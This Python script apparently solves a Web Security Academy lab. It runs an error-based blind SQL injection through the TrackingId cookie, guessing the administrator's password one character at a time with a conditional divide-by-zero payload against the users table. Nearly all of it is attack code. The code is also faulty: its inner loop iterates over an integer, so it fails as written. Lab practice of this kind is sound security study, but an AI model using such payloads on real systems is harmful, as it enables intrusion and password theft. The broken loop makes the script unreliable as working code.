import requests
letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
url = 'https://0a01006a03128d0f8046495400a40056.web-security-academy.net/filter?category=Gifts'#variable should contain the URL of the vulnerable web page.
cookie = 'mznLQAkBYzXFn5Sk'#cokie from the burpsuite tool
password = ''#variable will store the guessed password characters.
'''
The outer loop iterates through the positions of the password. In this case, it assumes that the password has a maximum length of 20 characters.
The inner loop iterates through each character in the letters list, representing the characters to be tried for the current position.
This line builds the payload by concatenating the current cookie value with a SQL injection payload.
The payload uses a SELECT statement to check if the guessed character j matches the character at position i of the password. If it matches, it triggers a division by zero error (to_char(1/0)) that will be handled in the subsequent code.
The query checks the table users for the administrator username
'''
for i in range(1,21):
    for j in len(letters):
        final_cookie = cookie +"'||(select case when substr(password,{},1)='{}' then to_char(1/0) else '' end from users where username ='administrator')||'".format(i,j)
        full_cookie = {"TrackingId":final_cookie}#The cookie payload is assigned to a dictionary with the key "TrackingId".
        print("Trying {} position with {}".format(i,j))
        temp = requests.get(url,cookies=full_cookie)
        if temp.status_code > 499:
            password += j
            break
        print(password)

print("This is the full-password: ",password)
